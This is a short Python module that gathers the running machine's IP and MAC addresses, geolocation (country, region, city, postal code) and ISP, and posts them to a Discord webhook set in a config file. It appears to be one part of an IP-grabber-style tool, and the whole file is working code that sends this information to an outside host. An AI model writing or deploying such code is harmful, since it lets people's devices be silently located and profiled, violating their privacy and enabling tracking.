from discord_webhook import *
import geo
from config import DEFAULT_COLOR, DEFAULT_WEBHOOK, GEO_INFO_TITLE, GEO_INFO_DESCRIPTION


webhook_url = DEFAULT_WEBHOOK  


color = DEFAULT_COLOR
title = GEO_INFO_TITLE 
description = GEO_INFO_DESCRIPTION

webhook = DiscordWebhook(url=webhook_url, content="", rate_limit_retry=True)


embed = DiscordEmbed(title=title, description=description, color=color)
embed.add_embed_field(name="", value=f"```IP Address: {geo.get_own_ip()} \nMAC Address: {geo.get_mac()}\nCountry: {geo.get_country()} \nRegion: {geo.get_region()} \nCity: {geo.get_city()} ({geo.get_zip()}) \nISP: {geo.get_isp()}```", inline=False)

webhook.add_embed(embed=embed)


def send_geo_info():
    response = webhook.execute()